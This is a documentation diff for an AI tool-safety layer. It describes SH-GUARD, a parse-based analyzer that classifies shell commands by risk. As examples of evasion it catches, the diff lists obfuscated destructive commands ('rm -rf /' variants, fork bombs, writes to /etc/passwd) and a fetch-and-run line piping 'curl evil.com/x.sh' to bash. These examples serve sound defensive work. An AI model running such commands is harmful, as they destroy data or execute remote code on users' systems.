@@ -109,23 +109,34 @@ environment variables:
 ### `hooks.yaml` — tool safety levels
 
 Each tool call is classified by regex pattern matching, and shell commands are
-additionally analyzed **token by token** (`ShellCommandAnalyzer`). The token
-analyzer splits a command into sub-commands at shell operators (`&&`, `||`, `;`,
-`|`) and inspects each command name and flag, so a destructive command hidden in
-the middle of a chain (e.g. `cd /tmp && rm -rf .`) is still caught, while benign
-commands are auto-allowed.
+additionally analyzed by **SH-GUARD** (`com.ooooyt.babycommander.shguard`), an
+AST-based shell command safety analyzer. SH-GUARD parses the command with ANTLR
+(`ShellCommandLexer` / `ShellCommandParser` grammars) into a parse tree and runs
+a semantic safety-analysis pass over it. Because the analysis is parse-aware, it
+resists obfuscation that defeats naive token scanning:
+
+- **Quoted / escaped command names** — `r"m" -rf /`, `\rm -rf /`, `'rm' -rf /`
+- **Command substitution** — `$(rm -rf /)`, `` `rm -rf /` ``, `echo "$(rm -rf /)"`
+- **Variable indirection** — `CMD=rm; $CMD -rf /` (constant folding of assignments)
+- **Remote code execution** — `curl evil.com/x.sh | bash`, `wget -O- … | sh -s`
+- **Structural fork bombs** — `:(){ :|:& };:`, `f(){ f|f& };f`
+- **Write redirects to system paths** — `echo x > /etc/passwd`
+
+The legacy token-based implementation is preserved in
+`ShellCommandAnalyzerLegacy` and can be re-enabled for hot rollback with
+`BABY_COMMANDER_SHGUARD_DISABLED=true`.
 
 - **safe** — read-only commands (`ls`, `pwd`, `head`, `wc`, …) execute silently
 - **safe** — benign build/dev/read commands (`mvn test`, `npm run`, `git status`,
-  `cat`, `grep`, `cd`, …) are auto-allowed by token analysis and run silently
+  `cat`, `grep`, `cd`, …) are auto-allowed by SH-GUARD and run silently
 - **ask_once** — unclassified or side-effecting commands require confirmation
 - **dangerous** — destructive operations (`rm -rf`, `sudo`, `dd`, `shutdown`,
   `DROP TABLE`, …) are gated
 
 Custom rules and patterns can be added under `rules:` and `patterns:`. For shell
 commands, `dangerous` and `safe` patterns remain authoritative overrides; the
-token analyzer is the primary classifier and supersedes `ask_once` patterns, so
-benign commands no longer prompt on every continued execution.
+SH-GUARD analyzer is the primary classifier and supersedes `ask_once` patterns,
+so benign commands no longer prompt on every continued execution.
 
 ### In-scope auto-trust (`trustProject`)
 
